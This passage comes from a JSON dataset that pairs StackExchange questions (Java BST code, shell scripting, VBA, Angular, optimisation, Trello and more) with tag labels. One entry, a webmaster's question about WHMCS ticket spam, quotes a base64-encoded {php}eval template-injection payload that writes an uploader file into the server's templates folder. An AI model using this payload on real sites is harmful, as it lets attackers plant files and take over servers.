IntegerObj();        recurseFloor(root, iobj, val);        return iobj.obj;    }    private void recurseCeiling (TreeNode node,  IntegerObj iobj, int value) {        if (node == null) {            return;        }        if (value <= node.item) {            iobj.obj = node.item;            recurseCeiling(node.left, iobj, value);        } else {            recurseCeiling(node.right, iobj, value);        }    }    private void recurseFloor (TreeNode node, IntegerObj iobj, int value) {        if (node == null) {            return;        }        if (value < node.item) {            recurseFloor (node.left, iobj, value);        } else {            iobj.obj = node.item;            recurseFloor (node.right, iobj, value);        }    }}public class FloorCeilingTest {    @Test    public void test1() {        FloorCeiling fc1 = new FloorCeiling(Arrays.asList(100, 50, 150, 25, 75, 125, 175));        assertEquals(25,  fc1.ceiling(20));        assertEquals(50,  fc1.ceiling(30));        assertEquals(75,  fc1.ceiling(70));        assertEquals(100, fc1.ceiling(90));        assertEquals(125, fc1.ceiling(120));        assertEquals(150, fc1.ceiling(145));        assertEquals(175, fc1.ceiling(160));    }    @Test    public void test2() {        FloorCeiling fc2 = new FloorCeiling(Arrays.asList(100, 50, 150, 25, 75, 125, 175));        assertEquals(25,  fc2.floor(27));        assertEquals(50,  fc2.floor(55));        assertEquals(75,  fc2.floor(78));        assertEquals(100, fc2.floor(110));        assertEquals(125, fc2.floor(128));        assertEquals(150, fc2.floor(160));        assertEquals(175, fc2.floor(180));    }}",
    "target": "java;tree"
  },
  {
    "id": "_unix.340984",
    "source": "Getting Mint MATE (Marco?) to put the window-close X in the actual corner, not just near it <eos> It's nice to be able to fling the mouse up and right, not having to bother with precise targeting, and click.  If your hand's already on the mouse, this is easier than switching back to the keyboard to press Alt+F4 for a quick window close.E.g. Windows (since at least 95) has made this work, although they at times had very annoying almost maximized window defaults that interfered with this quite a bit in some applications.  Nonetheless, actual maximized windows have always capitalized on Fitz' Law in their design this way.Is there any way to get this behaviour in Linux Mint MATE 18.1?  (Marco is the window manager, it seems.)  As it is, maximized windows will not close with a click in the upper-right corner.  One has to precisely back up a few pixels to activate the X and close it.",
    "target": "linux mint;window manager;mate"
  },
  {
    "id": "_cs.65629",
    "source": "Can formal languages be used to study mathematical notation? <eos> Question: Are there any introductory texts in formal language or programming language theory which discuss how to apply it to the study of optimal notation?In particular, I am interested to learn what stack-languages, parse trees, and indices are, and how to predict when a certain type of notation will lead to exponential redundancy.I have basically no background in either formal language/grammar or programming theory, since as a math major the only computer science I learned was algorithms and graph theory, as well as very modest smidgens of complexity theory and Boolean functions. Thus, if the only books which discuss this are not introductory, I would be grateful for answers that both list such books discussing exponential notation blow-up as well as introductory books that will prepare for the books which directly address my question.Context: This question is inspired primarily by an answer on Physics.SE, which says that:It is very easy to prove (rigorously) that there is no parentheses notation which reproduces tensor index contractions, because parentheses are parsed by a stack-language (context free grammar in Chomsky's classification) while indices cannot be parsed this way, because they include general graphs. The parentheses generate parse trees, and you always have exponentially many maximal trees inside any graph, so there is exponential redundancy in the notation.Throughout the rest of the answer, other examples of exponential notation blow-up are discussed, for example with Petri Nets in computational biology.There are also other instances where mathematical notation is difficult to parse, for example as mentioned here when functions and functions applied to the argument are not distinguished clearly. This can become especially confusing when the function becomes the argument and the argument becomes the function, e.g. here.",
    "target": "formal languages;reference request;formal grammars;programming languages"
  },
  {
    "id": "_softwareengineering.86099",
    "source": "Do you write unit tests for all the time in TDD? <eos> I have been designing and developing code with TDD style for a long time. What disturbs me about TDD is writing tests for code that does not contain any business logic or interesting behaviour. I know TDD is a design activity more than testing but sometimes I feel it's useless to write tests in these scenarios.For example I have a simple scenario like When user clicks check button, it should check file's validity. For this scenario I usually start writing tests for presenter/controller class like the one below.@Testpublic void when_user_clicks_check_it_should_check_selected_file_validity(){    MediaService service =mock(MediaService);    View view =mock(View);    when(view.getSelectedFile).thenReturns(c:\\\\Dir\\\\file.avi);    MediaController controller =new MediaController(service,view);    controller.check();    verify(service).check(c:\\\\Dir\\\\file.avi);}As you can see there is no design decision or interesting code to verify behaviour. I am testing values from view passed to MediaService. I usually write but don't like these kind of tests. What do yo do about these situations ? Do you write tests for all the time ?UPDATE :I have changed the test name and code after complaints. Some users said that you should write tests for the trivial cases like this so in the future someone might add interesting behaviour. But what about Code for today, design for tomorrow. ? If someone, including myself, adds more interesting code in the future the test can be created for it then. Why should I do it now for the trivial cases ?",
    "target": "unit testing;language agnostic;tdd"
  },
  {
    "id": "_webapps.44166",
    "source": "Configure Trello to share subset of cards on a board to certain users <eos> We use Trello as a kanban board to manage the work of multiple customer projects within our scrum team.  I would like to be able to give each customer access to the board, but they should only be allowed to see the cards for their projects.  How can I do this?",
    "target": "trello;trello organization;trello cards"
  },
  {
    "id": "_softwareengineering.55679",
    "source": "Why aren't we all doing model driven development yet? <eos> I am a true believer in Model Driven Development, I think it has the possibility to increase productivity, quality and predictability. When looking at MetaEdit the results are amazing. Mendix in the Netherlands is growing very very fast and has great results. I also know there are a lot of problemsversioning of generators, templates and frameworkprojects that just aren't right for model driven development (not enough repetition)higher risks (when the first project fails, you have less results than you would have with more traditional development)etcBut still these problems seem solvable and the benefits should outweigh the effort needed. Question: What do you see as the biggest problems that make you not even consider model driven development ?I want to use these answers not just for my own understanding but also as a possible source for a series of internal articles I plan to write.",
    "target": "development methodologies;mdd"
  },
  {
    "id": "_webapps.80595",
    "source": "Does deleting an email contact delete the previous emails from that contact? <eos> I have two contacts that changed their emails.  In order to have the correct email address auto pop, I deleted the first contact, but before deleting the second, I wondered if, once deleted, does that delete all previous emails from that contact?",
    "target": "gmail"
  },
  {
    "id": "_codereview.127891",
    "source": "Re-arranging an matrix of numbers to a numeric list <eos> If I have an array of numbers like this:1  3  4  6  71  22  4  5  95  71  2  3  5  Is there a quick way to take all of the unique numbers and arrange them into a single column, like this?12345679The approach I have works, but takes a very long time for large matrix:Sub Test1Call RecordArrangeCall RemoveDuplicates2End SubPrivate Sub RecordArrange()Worksheets(List).ActivateDim Rng As RangeDim i As Longi = 1Application.ScreenUpdating = FalseApplication.EnableEvents = FalseApplication.Calculation = xlManualApplication.DisplayStatusBar = FalseApplication.EnableEvents = FalseDim lastRow As LonglastRow = Range(A1).End(xlDown).rowWhile i <= lastRowSet Rng = Range(A & i)If IsEmpty(Rng.Offset(0, 1).Value) = False ThenRng.Offset(0, 1).CopyRng.Offset(1, 0).Insert Shift:=xlDownRng.Offset(0, 1).Delete Shift:=xlToLeftElse: i = i + 1End IfWendColumns(A:A).Select    ActiveWorkbook.Worksheets(List).Sort.SortFields.Clear    ActiveWorkbook.Worksheets(List).Sort.SortFields.Add Key:=Range(A1), _        SortOn:=xlSortOnValues, Order:=xlAscending, DataOption:=xlSortNormal    With ActiveWorkbook.Worksheets(List).Sort        .SetRange Range(A1:A8000)        .Header = xlNo        .MatchCase = False        .Orientation = xlTopToBottom        .SortMethod = xlPinYin        .Apply    End With    Application.EnableEvents = TrueApplication.Calculation = xlAutomaticApplication.DisplayStatusBar = TrueApplication.EnableEvents = TrueEnd SubPrivate Sub RemoveDuplicates2()Dim Rng As RangeDim i As Longi = 1Application.ScreenUpdating = FalseApplication.EnableEvents = FalseApplication.Calculation = xlManualApplication.DisplayStatusBar = FalseApplication.EnableEvents = FalseDim lastRow As LonglastRow = Range(A1).End(xlDown).rowWhile i <= lastRowSet Rng = Range(A & i)If Rng = Rng.Offset(1, 0) And IsEmpty(Rng.Value) = False ThenRng.Delete Shift:=xlUpElseIf Rng <> Rng.Offset(1, 0) And IsEmpty(Rng.Value) = False Theni = i + 1ElseIf Application.WorksheetFunction.CountA(Rng) = 0 Theni = i + 1Else: i = i + 1End IfWend    Application.EnableEvents = TrueApplication.Calculation = xlAutomaticApplication.DisplayStatusBar = TrueApplication.EnableEvents = TrueEnd SubThis does work, but it seems like a very roundabout approach. Is there a better way? ",
    "target": "vba;excel"
  },
  {
    "id": "_webmaster.101621",
    "source": "Does the Enhanced Ecommerce data layer need to be sent on non-ecommerce pages <eos> I'm using Google Tag Manager to add Google Analytics.As the title suggests, do I need to Enable Enhanced Ecommerce Features for all pages, or should I create a tag that is triggered on actual ecommerce pages and enable it there.",
    "target": "google analytics;google tag manager"
  },
  {
    "id": "_codereview.91203",
    "source": "Using setTimeout to get scrolling chat window to work, but doesn't feel like the ideal solution <eos> My friend and I are working on a bare-bones chat web app, using Angular on the front end. He's using Swampdragon for some of the real-time stuff.My task that I set out to achieve was to get the chat window to scroll to the bottom when a chat room is loaded (most relevant bit is $dragon.onChannelMessage):app.controller('ChatRoomCtrl',        ['$scope', '$dragon', 'ChatStatus', 'Users', function (            $scope, $dragon, ChatStatus, Users) {    $scope.channel = 'messages';    $scope.ChatStatus = ChatStatus;    $scope.idToUser = function(id) {        var user;        user = $scope.users.filter(function(obj) {            return obj.pk == id;        });        return user[0].display_name;    };    Users.getList().then(function(users) {        $scope.users = users;    });    $dragon.onReady(function() {        $dragon.subscribe('messages', $scope.channel).then(function(response) {            $scope.dataMapper = new DataMapper(response.data);        });    });    $dragon.onChannelMessage(function(channels, message) {        if (indexOf.call(channels, $scope.channel) > -1) {            if (ChatStatus.messages[message.data.room].indexOf(message.data) == -1) {                message.data.posted = new Date(message.data.posted);                $scope.$apply(function() {                    ChatStatus.messages[message.data.room].push(message.data);                    setTimeout(function() {                        scrollToBottom();                    }, 30);                });            }        }    });}]);Or, when a new message is pushed:app.controller('RoomCtrl', ['$scope', 'Rooms', 'Messages', 'ChatStatus', function($scope, Rooms, Messages, ChatStatus) {    $scope.changeRoom = function(room) {        ChatStatus.selectedRoom = room;        Messages.getList({'room': room.id}).then(function(messages) {            angular.forEach(messages, function(message, key) {                message.posted = new Date(message.posted);            });            ChatStatus.messages[room.id] = messages;            setTimeout(function() {                scrollToBottom();            }, 30);        });    }    $scope.rooms = Rooms.getList()    .then(function(rooms) {        ChatStatus.rooms = rooms;        ChatStatus.selectedRoom = rooms[0];        $scope.rooms = rooms;    })}]);In both controllers, I refer to the scrollToBottom function:function scrollToBottom() {    var chatWindow = document.querySelector('.the-chats');    var mostRecent = chatWindow.querySelector('li:last-child');    var mostRecentDimensions = mostRecent.getBoundingClientRect();    var chatWindowScrollY = chatWindow.scrollTop;    chatWindow.scrollTop = mostRecentDimensions.bottom + chatWindowScrollY;}If I remove the setTimeout from the first controller, it'll scroll to what is the last item in the list before the new message is pushed, while the second controller will error out.If the setTimeout is in place, this does what I want it to do. However, it feels like a bad solution; it certainly doesn't feel like an 'Angular' way.I've read a bit about promises, deferred objects, $q, etc., but the examples always seem to use it in the context of AJAX-types of calls, so I don't know if that applies here. But that's really what I'm looking for, right? Push the new message, then do the scroll?",
    "target": "javascript;angular.js;chat"
  },
  {
    "id": "_unix.158329",
    "source": "Unable to launch Firefox: keeps on crashing <eos> Unable to launch Firefox in CentOS 6. Installed package using yum install firefox.It repeatedly shows this error,XPCOMGlueLoad error for file /usr/lib/firefox/libxul.so:libvpx.so.1: cannot open shared object file: No such file or directoryCouldn't load XPCOM.How to rectify this error?",
    "target": "libraries;firefox"
  },
  {
    "id": "_vi.4817",
    "source": "Is there a vim command line option to edit last edited file? <eos> Is there a way to run vim from command line to edit the last edited file?Let say I first edit file giorgio.sh:$ vi giorgio.shAfterwards, I exit back to terminal$ do something...$ do something else...$ do something else again...Is there a way to edit again the file in vim, maybe using some vim command line parameter/option ?$ vi {option to edit last edited/saved file}I mean without using:an internal vim command like :browse oldfilesthe beautiful MRU pluginthe  bash history (requiring to scroll, if, after your edit, you ran some other commands)It is strange that it doesn't seem possible to do a so common task in a super quick Vim way.",
    "target": "invocation;options"
  },
  {
    "id": "_unix.231282",
    "source": "How to limit the size of log files which are generated by scripts runs at startup <eos> So, how can I limit the log file size or how to automate to delete the files, if the files are reached a particular size. Here is the actual scenario PLEASE CHECK HERE. For testing, I deleted log file /root/folder/my_output_file.log, while script is running, but after deletion the log file was not regenerated. Or I have do any modifications to script to log the output properly.Thanks ",
    "target": "shell script;logs"
  },
  {
    "id": "_unix.283837",
    "source": "Default audio (Pygame.mixer and alsamixer) doesn't work when using sudo <eos> I have a simple python file which plays a sound:#sound_test.pyimport pygame#init soundspygame.mixer.pre_init(44100, 16, 2, 4096)pygame.init()pygame.mixer.init()WAV = pygame.mixer.Sound(Music/4AM_cry.wav)WAV.play()EDIT: I've found that if I run alsamixer it shows the correct audio out but sudo alsamixer does not.If I run python3 soundtest.py it works but sudo python3 soundtest.py does not.  What's going on?P.S.  I have a USB DAC I'm using on a RPi.  It is set to the default audio card.",
    "target": "sudo"
  },
  {
    "id": "_cs.66486",
    "source": "Goldbach Conjecture and Busy Beaver numbers? <eos> Background: I am a complete layman in computer science.I was reading about Busy Beaver numbers here, and I found the following passage:Humanity may never know the value of BB(6) for certain, let alone that of BB(7) or any higher number in the sequence.Indeed, already the top five and six-rule contenders elude us: we cant explain how they work in human terms. If creativity imbues their design, its not because humans put it there. One way to understand this is that even small Turing machines can encode profound mathematical problems. Take Goldbachs conjecture, that every even number 4 or higher is a sum of two prime numbers: 10=7+3, 18=13+5. The conjecture has resisted proof since 1742. Yet we could design a Turing machine with, oh, lets say 100 rules, that tests each even number to see whether its a sum of two primes, and halts when and if it finds a counterexample to the conjecture. Then knowing BB(100), we could in principle run this machine for BB(100) steps, decide whether it halts, and thereby resolve Goldbachs conjecture. Aaronson, Scott. Who Can Name the Bigger Number? Who Can Name the Bigger Number? N.p., n.d. Web. 25 Nov. 2016.It seems to me like the author is suggesting that we can prove or disprove the Goldbach Conjecture, a statement about infinitely many numbers, in a finite number of calculations. Am I missing somehing?",
    "target": "turing machines;number theory;busy beaver"
  },
  {
    "id": "_unix.308370",
    "source": "How can I set environment variables for a program executed using `nohup`? <eos> (I'm editing an existing Bash script, so I'm probably making a silly mistake here...)I have a shell script that saves a command with an environment variable as its argument like this:COMMAND=mvn clean install -P $MAVEN_PROFILEIt then executes the command with nohup roughly as follows:nohup $COMMAND > logfileThis works.Now, I want to set an environment variable that can be accessed in Maven. I've tried several things like the following:COMMAND=FORMAVEN=valueForMaven mvn clean install -P $MAVEN_PROFILE...but then it just terminates with:nohup: failed to run command `FORMAVEN=valueForMaven': No such file or directoryI feel like there are several unrelated concepts at work here, none of which I understand or even know about. What do I need to be able to do the above?",
    "target": "bash;shell script;environment variables;nohup;subshell"
  },
  {
    "id": "_scicomp.2441",
    "source": "How to add back integral constraints to linear program solution <eos> I am implementing a machine learning algorithm for which I need to solve an integer linear program. To get the solution in polynomial time, the authors of the algorithm have dropped the integral constraints and instead solve the corresponding linear program.I am not too aware of the theory of optimization, so using the Mosek optimization tool-kit as a black-box to solve the LP. Now obviously I have to add back the integral constraints once the solution of LP is obtained. Any ideas how to go about it? I am sure Mosek and other popular LP solvers would have an option for the same but can't seem to find it in their documentation or elsewhere.Thanks.",
    "target": "optimization;linear programming"
  },
  {
    "id": "_webapps.84667",
    "source": "How to remove blank canvas pages from draw.io <eos> I created a one page flow-chart with draw.io and printed it. After opening it again to create a new version, it opened to what I thought was a blank page. There was now page after page of blank canvas, with the project in the lower right corner.I tried to go to Document Properties Custom but that didn't remove the blank pages. There is no obvious way to remove them. The structure chart content is neatly within the one page, so I don't see why it would automatically add more. The main problem is that I can't print or save because the file is so large my laptop freezes or otherwise stalls when trying to print or save as a pdf.How can I remove these blank pages?",
    "target": "draw.io"
  },
  {
    "id": "_softwareengineering.90859",
    "source": "How best to handle database refactoring within a team? <eos> We are currently usign a roll-forward approach to DB changes, akin to Migrations, where each developer creates and checks in a script that promotes the latest version of the DB to a new state. Problems arise when multiple developers concurrently work on non-trivial tasks and end up making changes to the DB that interfere with each other. The 'non-trivial' bit is significant because if the tasks take long enough, and if DB changes occurr early enough in the cycle, neither dev ends up being aware of the other's changes, and we end up with either a DB merge nightmare (preferred case) or an inadvertently broken database.Can these situations be easily avoided? Are there database refactoring strategies that effectively handle the scenario of multiple developers actively changing the schema?If it matters, we use SQL Server.",
    "target": "database;refactoring;sql server"
  },
  {
    "id": "_scicomp.7001",
    "source": "Solving unconstrained nonlinear optimization problems on GPU <eos> I am trying to solve some unconstrained nonlinear optimzation problems on GPU(CUDA).The objective function is a smooth nonlinear function, and its gradient is relatively cheap to compute analytically, so I dont need to bother with numerical approximation.I want to solve this problem with mostly fp32 maths ops (for various reasons), so which nonlinear optimization method is more robust against round-up errors whilst has good performance? (e.g. conjugate gradient/quasi newton/trust region), have anyone tried BFGS on GPU with good results?btw, the Hessian, if needed, is relatively small in my case (<64x64 typically), but I need to solve thousands of these small scale optimzation problems concurrently.",
    "target": "optimization;cuda"
  },
  {
    "id": "_codereview.91402",
    "source": "Calculate grades based on pass/fail percentage <eos> Our school grading scale is from 1..10 with one decimal. If you do nothing you still get a grade of 1.0. A passing grade equals 5.5. A 'cesuur' percentage defines at what percentage of correct answers the 5.5 will be given to a student.Examples:List itemGrade(0,100,x) should always result in 1.0Grade(100,100,x) should always results in 10.0Grade(50,100,0.5) should result in 5.5Questions: how can I simplify the code? How can I make it more robust?Public Function Grade(Points As Integer, MaxPoints As Integer, Cesuur As Double) As Double    Dim passPoints As Integer    Dim maxGrade As Integer    Dim minGrade As Integer    Dim passGrade As Double    Dim base As Double    Dim restPoints As Integer    Dim restPass As Double    passPoints = Cesuur * MaxPoints    maxGrade = 10    minGrade = 1    passGrade = (maxGrade + minGrade) / 2    base = maxGrade - passGrade    If Points < passPoints Then        Grade = 1 + (passGrade - minGrade) * Points / passPoints    Else        restPoints = MaxPoints - Points        restPass = MaxPoints * (1 - Cesuur)        Grade = maxGrade - restPoints * base / restPass    End If    Grade = Round(Grade, 1)End Function",
    "target": "vba"
  },
  {
    "id": "_unix.339093",
    "source": "mogrify -monochrome to several Picture <eos> I have some Picture, that I want have in black and white.I'am in the right folder. -rw-r--r-- 1 alex alex  1027 Jan 21 13:07 target-0.jpg-rw-r--r-- 1 alex alex  1001 Jan 21 12:17 target-1.jpg-rw-r--r-- 1 alex alex   957 Jan 21 12:17 target-2.jpg-rw-r--r-- 1 alex alex   982 Jan 21 12:17 target-4.jpgWhy do this not work? for i in *.jpg ; do mogrify -monochrome ; doneNo errors, but no black and white Pictures. When I convert them single mogrify -monochrome target-0.jpg it works as expected. Version of imagemagickapt-cache policy imagemagickimagemagick:  Installiert:           8:6.8.9.9-5+deb8u6  Installationskandidat: 8:6.8.9.9-5+deb8u6  Versionstabelle: *** 8:6.8.9.9-5+deb8u6 0        500 http://security.debian.org/ jessie/updates/main amd64 Packages        500 http://http.us.debian.org/debian/ jessie/main amd64 Packages        100 /var/lib/dpkg/statusAnd env | grep -i shellSHELL=/bin/bash",
    "target": "bash;command line;imagemagick;image manipulation"
  },
  {
    "id": "_unix.4840",
    "source": "Adding numbers from the result of a grep <eos> I run the following command:grep -o [0-9] errors verification_report_3.txt | awk '{print $1}'and I get the following result:1408I'd like to add each of the numbers up to a running count variable.  Is there a magic one liner someone can help me build?",
    "target": "bash;shell;grep"
  },
  {
    "id": "_webapps.58069",
    "source": "Is there a simple way to attribute a CC image on flickr? <eos> To legally reuse a CC image from Flickr, you must attribute properly the source and license, as explained on this blog: http://librarianbyday.net/2009/09/28/how-to-attribute-a-creative-commons-photo-from-flickr/ Another question about how to properly attribute was answered https://webapps.stackexchange.com/a/47595/19350Proper attribution involves many steps of linking info back to the source. The relative complexity of attribution seems to dissuade people from properly doing this (they will tend to just copy/paste the image and be done with it). Is there a tool or place on Flickr where I can copy/paste the attribution to a CC image such that I can simplify this process? I'm looking for a Copy image with attribution feature, that when you then paste, supplies all the information in various formats. Note that when I copy text from my Kindle reader on PC, the text will be pasted with a reference to the book and location (relative within). It's a smart copy/paste that sort-of does what I'm asking. Here's an example (I just selected a paragraph in the Kindle, did a copy, then pasted it here. The second part contains the attribution to the book.):Applying the Language To apply the patterns in this book to the solution of the example problem, first build a working pattern language for the project. The language will contain those elements of the fault tolerant vocabulary presented here that will be useful in the design of the system. Patterns are not included if they will clearly not be needed or useful.Hanmer, Robert (2013-07-12). Patterns for Fault Tolerant Software (Wiley Software Patterns Series) (Kindle Locations 4972-4975). Wiley. Kindle Edition. I'm looking for something similar, but with CC images on Flickr.",
    "target": "images;flickr;copyright;copy paste"
  },
  {
    "id": "_cs.80246",
    "source": "How to model reversible interactive programs <eos> Reversible programs with finite execution steps are well studied. For example, a Turing machine whose transitions are reversible and halts can be executed backwards consuming its tape in the reverse order. A variant of Turing machines with distinct input, output, and work tapes can be similarly executed in reverse to consume its output and regenerate its input, assuming it halted with an empty work tape in the forward execution (to avoid the possibility of stashing input information in the work tape).Is there any work for the equivallent concepts in the setting of interactive programs (in the spirit of https://en.wikipedia.org/wiki/Interactive_computation)? In the three-tape Turing machine model described, it is clearly possible to have infinite interactive runs consuming an infinite input stream and emitting an infinite output stream while storing intermediate results in the work tape. Some of these programs are clearly reversible in an analogous way to the finite programs, but cannot be covered by that formalism if they are non-halting. How can we characterize reversible interactive programs in this model? We need to exclude programs that simply stash away their input in the work tape, but unlike the finite case, we can't simply require that the program ends with an empty work tape.Is there any work on such reversible interactive programs?",
    "target": "turing machines;reference request;reversible computing"
  },
  {
    "id": "_unix.385515",
    "source": "Return a specific/200 status code for a particular URL prefix in Haproxy <eos> In Nginx we can return a specific status code to URL prefix like this.location /api {    return 200; }How can we achieve the same in Haproxy?. Gone through Haproxy ACL but couldn't find any. ",
    "target": "linux;webserver;haproxy"
  },
  {
    "id": "_unix.292607",
    "source": "for loop # usage <eos> I am trying to understand how this piece of code works:for b in `git branch -r`; do git branch --track ${b##upstream/} $b; doneIn particular, the part where it does${b##upstream/}I know it cuts the characters upstream/ from $b, but I want to know how or why this works. I found this snippet on a forum.",
    "target": "shell;variable"
  },
  {
    "id": "_unix.194292",
    "source": "Recursively list files containing an underscore in the file name <eos> I have a large directory with tons of files and subdirectories in it. Is there a way to recursively search through all of these files and subdirectories and print out a list of all files containing an underscore (_) in their file name?",
    "target": "files;recursive"
  },
  {
    "id": "_computerscience.5443",
    "source": "iPhone GLU(OpenGL Utility Library) <eos> This link says iPhoneGLU says, this libraray supports below futures.Matrix manipulationPolygon tessellationI would like to know whether I can use this library to draw primitives(lines,points,triangles,simple polygon).Thank you.",
    "target": "opengl es"
  },
  {
    "id": "_scicomp.7833",
    "source": "Numerical evaluation of partial derivatives <eos> I need to evaluate the following derivative:$$\\frac{1}{\\prod_i \\xi_i!}\\frac{1}{\\prod_j \\eta_j!}\\left.\\frac{\\partial^{\\xi_1 + \\cdots + \\xi_m}}{\\partial\\alpha_1^{\\xi_1}\\ldots\\partial\\alpha_m^{\\xi_m}}\\frac{\\partial^{\\eta_1 + \\cdots + \\eta_n}}{\\partial\\beta_1^{\\eta_1}\\ldots\\partial\\beta_n^{\\eta_n}}\\exp\\left(\\sum_{ij} a_{ij} \\alpha_i \\beta_j\\right)\\right|_{\\alpha_1 = \\cdots = \\alpha_m = \\beta_1 = \\cdots = \\beta_n = 0}$$where the $\\xi_i$ and $\\eta_j$ are non-negative integers, with $i = 1...m$ and $j = 1...n$, and the $a_{ij}$ are non-negative real numbers.Is there a good numerical algorithm to do this? Is it efficient?(See also: https://math.stackexchange.com/a/430925/10063)",
    "target": "algorithms"
  },
  {
    "id": "_codereview.116967",
    "source": "Dynamic Dispatch replacement for Generic methods <eos> Type erasure is giving me nuts recently. I'm designing a class that performs symbolic differentiation on a math expression represented as a binary expression tree. The question is more on the design part than on the actual code part so I'm only giving out the method that looks awful to me.public Node derive(final Node currentNode, Node parentNode) {    Node dxNode = null;    final Object cDataContext = currentNode.getData();    if (Number.class.isAssignableFrom(cDataContext.getClass()))        dxNode = new TreeNode<Double>(0.0);    else if (AddOperator.class.isAssignableFrom(cDataContext.getClass()))        dxNode = deriveAddContext((Node<AddOperator>) currentNode);    else if (MulOperator.class.isAssignableFrom(cDataContext.getClass()))        dxNode = deriveMulContext((Node<MulOperator>) currentNode);    else if (SineFunction.class.isAssignableFrom(cDataContext.getClass()))        dxNode = deriveSineContext((Node<SineFunction>) currentNode);    if (dxNode != null && parentNode != null)        dxNode.setParent(parentNode);    return dxNode;}I think it already speaks for itself. I'm having methods with different names which is fine. The awful part at least for me is this huge if statement that I truncated for simplicity. Is there a better way of doing this? I mean I would love to live with dynamic dispatch having the whole derive method consisting of a simple:Node dxNode = deriveNode(currentNode);dxNode.setParent(parentNode);return dxNode;I guess Java won't give me this luxury so perhaps there is some design pattern that I can utilize here? Just to give you a better understanding of the algorithm I'll show a sample method:private Node<AddOperator> deriveAddContext(final Node<AddOperator> additionContext) {    // d/dx [f(x) + g(x)] = d/dx [f(x)] + d/dx [g(x)] => d/dx [f(x)] d/dx [g(x)] +    // ROOT: ADD    Node<AddOperator> dRoot = new TreeNode<AddOperator>(new AddOperator());    // ROOT.LEFT: d/dx [f(x)]    dRoot.setLeft(derive(additionContext.getLeft(), dRoot));    // ROOT.RIGHT: d/dx [g(x)]    dRoot.setRight(derive(additionContext.getRight(), dRoot));    // RET: d/dx    return dRoot;}So the whole algorithm is recursive on the expression traversing the original expr in an inorder fashion.A Node has the following structure: dataField: <DataType> leftChild: Node rightChild: Node parent: Node",
    "target": "java;object oriented;design patterns"
  },
  {
    "id": "_webmaster.26523",
    "source": "Should WHMCS hacking attemps that never succeed be important to me? <eos> I have WHMCS and I use it with no problem for my hosting purposes.Almost every 2 or 3 days, I can see a spam with malicious content submitted as a new ticket that tries to hack.The last one was:Subject:{php}eval(base64_decode('JGNvZGUgPSBiYXNlNjRfZGVjb 2RlKCJQRDl3YUhBTkNtVmphRzhnSnp4bWIzSnRJR0ZqZEdsdmJ qMGlJaUJ0WlhSb2IyUTlJbkJ2YzNRaUlHVnVZM1I1Y0dVOUltM TFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJRzVoYldVOUluVnd iRzloWkdWeUlpQnBaRDBpZFhCc2IyRmtaWElpUGljN0RRcGxZM mh2SUNjOGFXNXdkWFFnZEhsd1pUMGlabWxzWlNJZ2JtRnRaVDB pWm1sc1pTSWdjMmw2WlQwaU5UQWlQanhwYm5CMWRDQnVZVzFsU FNKZmRYQnNJaUIwZVhCbFBTSnpkV0p0YVhRaUlHbGtQU0pmZFh Cc0lpQjJZV3gxWlQwaVZYQnNiMkZrSWo0OEwyWnZjbTArSnpzT kNtbG1LQ0FrWDFCUFUxUmJKMTkxY0d3blhTQTlQU0FpVlhCc2I yRmtJaUFwSUhzTkNnbHBaaWhBWTI5d2VTZ2tYMFpKVEVWVFd5Z G1hV3hsSjExYkozUnRjRjl1WVcxbEoxMHNJQ1JmUmtsTVJWTmJ KMlpwYkdVblhWc25ibUZ0WlNkZEtTa2dleUJsWTJodklDYzhZa jVWY0d4dllXUWdVMVZMVTBWVElDRWhJVHd2WWo0OFluSStQR0p 5UGljN0lIME5DZ2xsYkhObElIc2daV05vYnlBblBHSStWWEJzY jJGa0lFZEJSMEZNSUNFaElUd3ZZajQ4WW5JK1BHSnlQaWM3SUg wTkNuME5DajgrIik7DQokZm8gPSBmb3BlbigidGVtcGxhdGVzL 2p4aC5waHAiLCJ3Iik7DQpmd3JpdGUoJGZvLCRjb2RlKTt=')) ;{/php})Message:{php}eval(base64_decode('JGNvZGUgPSBiYXNlNjRfZGVjb 2RlKCJQRDl3YUhBTkNtVmphRzhnSnp4bWIzSnRJR0ZqZEdsdmJ qMGlJaUJ0WlhSb2IyUTlJbkJ2YzNRaUlHVnVZM1I1Y0dVOUltM TFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJRzVoYldVOUluVnd iRzloWkdWeUlpQnBaRDBpZFhCc2IyRmtaWElpUGljN0RRcGxZM mh2SUNjOGFXNXdkWFFnZEhsd1pUMGlabWxzWlNJZ2JtRnRaVDB pWm1sc1pTSWdjMmw2WlQwaU5UQWlQanhwYm5CMWRDQnVZVzFsU FNKZmRYQnNJaUIwZVhCbFBTSnpkV0p0YVhRaUlHbGtQU0pmZFh Cc0lpQjJZV3gxWlQwaVZYQnNiMkZrSWo0OEwyWnZjbTArSnpzT kNtbG1LQ0FrWDFCUFUxUmJKMTkxY0d3blhTQTlQU0FpVlhCc2I yRmtJaUFwSUhzTkNnbHBaaWhBWTI5d2VTZ2tYMFpKVEVWVFd5Z G1hV3hsSjExYkozUnRjRjl1WVcxbEoxMHNJQ1JmUmtsTVJWTmJ KMlpwYkdVblhWc25ibUZ0WlNkZEtTa2dleUJsWTJodklDYzhZa jVWY0d4dllXUWdVMVZMVTBWVElDRWhJVHd2WWo0OFluSStQR0p 5UGljN0lIME5DZ2xsYkhObElIc2daV05vYnlBblBHSStWWEJzY jJGa0lFZEJSMEZNSUNFaElUd3ZZajQ4WW5JK1BHSnlQaWM3SUg wTkNuME5DajgrIik7DQokZm8gPSBmb3BlbigidGVtcGxhdGVzL 2p4aC5waHAiLCJ3Iik7DQpmd3JpdGUoJGZvLCRjb2RlKTt=')) ;{/php})What are these attacks? Why don't they use any other way to attack?!!!In my opinion it is obvious that a system like WHMCS will never be hacked by such a poor attempts. They should have of course used some functions like strip_tags and mysql_real_escape_string and other security functions.Would any body explain why do they always select such a poor way to attack? Don't they really know that WHMCS is stronger than these low level hacks?In fact I'd like to know that: Do these efforts differ from each other? Can they be serious? Should I be scared of these attempts?",
    "target": "php;server;security;hacking"
  },
  {
    "id": "_unix.322912",
